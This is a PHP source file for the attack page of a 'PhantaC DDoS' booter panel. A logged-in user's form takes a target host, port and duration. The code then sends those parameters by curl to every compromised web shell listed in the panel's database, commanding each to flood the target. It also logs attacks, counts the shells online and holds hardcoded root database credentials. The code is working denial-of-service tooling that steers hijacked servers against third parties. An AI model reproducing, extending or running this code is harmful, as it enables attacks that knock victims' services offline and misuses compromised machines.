<?php
/**
 * Hit.php
 *
 * This is an example of the ddos page. Here
 * users will be able to poop on kids. However, like on most kids
 * the hit form doesn't just have to be on the main page.
 *
 * Written by: Xbl Blue
 * Last Updated: March 2, 2011
 */
ini_set('display_errors', '0');     # don't show any errors...
error_reporting(E_ALL | E_STRICT);  # ...but do log them
#if php < 5 remove init_set and error reporting.

include("core/session.php");
?>
<html>
<title>PhantaC DDoS</title>
<link href="include/login.css" rel="stylesheet" type="text/css" />

<script type="text/javascript">
function showText(obj)
{
if(obj.value =='3074')
{
document.getElementById('port').value='3074';
}

if(obj.value=='80')
{
document.getElementById('port').value='80';
}

if(obj.value=='21')
{
document.getElementById('port').value='21';
}

if(obj.value=='43594')
{
document.getElementById('port').value='43594';
}
return;
}
// Popup window code
function newPopup(url) {
	popupWindow = window.open(
		url,'popUpWindow','height=350,width=500,left=10,top=10,resizable=no,scrollbars=yes,toolbar=no,menubar=no,location=no,directories=no,status=yes')
}
</script>


<body>
<?php
/**
 * User has already logged in, so display relavent links, including
 * a link to the admin center if the user is an administrator.
 */
if($session->logged_in){
?>		
		<center>
                    <img alt=""  src="images/logo.png" /><br><br>
		</center>
<?php
   echo "Welcome <b>$session->username</b>. <br><br>"
       ."[<a href=\"index.php\">Main</a>] &nbsp;&nbsp;"
       ."[<a href=\"user/userinfo.php?user=$session->username\">My Account</a>] &nbsp;&nbsp;"
       ."[<a href=\"user/useredit.php\">Edit Account</a>] &nbsp;&nbsp;";
   if($session->isAdmin()){
      echo "[<a href=\"admin/admin.php\">Admin Center</a>] &nbsp;&nbsp;";
   }
   echo "[<a href=\"JavaScript:newPopup('include/shoutbox/index.php');\">Shoutbox</a>] &nbsp;&nbsp";
   echo "[<a href=\"core/process.php\">Logout</a>]";
/* DDOS TABLE */
?>
<br /><br />
<br /><br />

<div class="Shellcount" align="center">
<b>There are currently <font color="darkred">
<?php

/* SHELLS CHECK*/
$link = mysql_connect("localhost", "root", "poiupoiu");
mysql_select_db("phantacdb", $link);
/* get Shells Amt */
$result = mysql_query("SELECT * FROM sqlshells", $link);
$pubshells = mysql_num_rows($result);
/* Post Shells Amt */
$result2 = mysql_query("SELECT * FROM privshells", $link);
$privshells = mysql_num_rows($result2);
echo $pubshells + $privshells;

?>
</font> Shells online.
</b>
</div>

<div class="content">
<p>
<form action="hit.php">
  <table width="350" border="0" align="center" cellpadding="2" cellspacing="0">
	<tr>
    <td>IP/DNS:</td>
	<td><input type="text" name="host"/></td>
	</tr>
	
	<tr>
    <td>Seconds:</td>
	<td><input type="text" name="time"/></td>
	</tr>
	
	<tr>
    <td>Port:</td>
	<td><input type="text" id="port" name="port"/></td>
	</tr>
	
	<tr>
	<td>
	<input type="radio" onclick="showText(this)" name="" value="3074"><font size ="2">Xbox</font>
	<input type="radio" onclick="showText(this)" name="" value="80"><font size ="2">Website</font>
	<input type="radio" onclick="showText(this)" name="" value="21"><font size ="2">Ftp</font>
	<input type="radio" onclick="showText(this)" name="" value="43594"><font size ="2">RS</font>
	</td>
	</tr>
	
	<tr>
	<td colspan="2" align="right">
    <input type="submit" value="Attack" />
	</td>
	</tr>
	
	</table>
	<center>
	<font color="#FFFFFF"><b>Notice</b>:</font><font color=red> Constant flooding of the same ip(s) will result in ban.</font>
	</center>
<?php
set_time_limit(0);  
ignore_user_abort(TRUE);  

include'include/tools/Curl.php';
require("include/tools/SQLCore.php");
require("include/tools/SQL.php");

if (isset($_GET['host']) && isset($_GET['time']) && isset($_GET['port']))
{
	//GET SHELL SUPPORT
	$SQL = new ezSQL_mysql();
	$SQL->connect("root", "poiupoiu"); 
	$SQL->select("phantacdb");
	$Query = "SELECT * FROM `sqlshells`";  
        $AffectedRows = $SQL->query($Query);
        $host = $_GET['host'];
        $time = intval($_GET['time']);
        $port = intval($_GET['port']);
		$mc = Curl::getInstance();
		$ch = array();
    for($i = 0; $i < $AffectedRows; $i++)
    {
	$row = $SQL->last_result[$i];
        $shell = trim($row->URL);
        if (strlen($shell) == 0)
            continue;
        $shell .= "?act=phptools&host={$host}&time={$time}&port={$port}";  
	     #echo $shell;
        $ch[$i] = curl_init($shell);
        curl_setopt($ch[$i], CURLOPT_RETURNTRANSFER, 1); 
		curl_setopt($ch[$i], CURLOPT_TIMEOUT, 15);
        $curl1 = $mc->addCurl($ch[$i]);	      
    }
         //POST SHELL SUPPORT:
	$Query = "SELECT * FROM `privshells`"; 
	$AffectedRows = $SQL->query($Query);
    $ch2 = array();
    $post = "ip={$host}&time={$time}&port={$port}";
	//support for POST shells
    for($i = 0; $i < $AffectedRows; $i++)
    {
		$row = $SQL->last_result[$i];
        $shell = trim($row->URL);
        if (strlen($shell) == 0)
            continue;			
        $header = array();
		$header[] = "Cache-Control: max-age=0"; 
		$header[] = "Connection: keep-alive"; 
		$header[] = "Keep-Alive: 300"; 
		$header[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7"; 
		$header[] = "Accept-Language: en-us,en;q=0.5"; 
		$header[] = "Pragma: ";
        $ch2[$i] = curl_init($shell);
		curl_setopt($ch2[$i], CURLOPT_HTTPHEADER, $header); 
        curl_setopt($ch2[$i], CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch2[$i], CURLOPT_FORBID_REUSE, 1);
        curl_setopt($ch2[$i], CURLOPT_POST, 1);
        curl_setopt($ch2[$i], CURLOPT_POSTFIELDS, $post);
        $curl1 = $mc->addCurl($ch2[$i]);       
    }
    echo "<br /><br /><br /><br />";
        if(!$session->isAdmin()){
        if($database->logDDoS($session->username, $_SERVER['REMOTE_ADDR'], $_GET['host'])) {
        echo "<center>Successful log and request initiated!</center>";
        } else {
        echo "<center><font color=red>Success, Failed Log! Please contact an Administrator!</font></center>";
        }
        } else {
        echo "<center>Success!</center>";
        }
        echo "<br /><br /><br /><br />";
}
$result = mysql_query("SELECT * FROM logs", $link);
$numlogs = mysql_num_rows($result);
echo "<center>There Are Currently $numlogs DDoS'(s) Logged!</center>";
echo "</form></div>";
echo"<br /><br />";
include("include/footer.php");
} else {
  Header("Location: index.php");
}
?>
</body>
</html>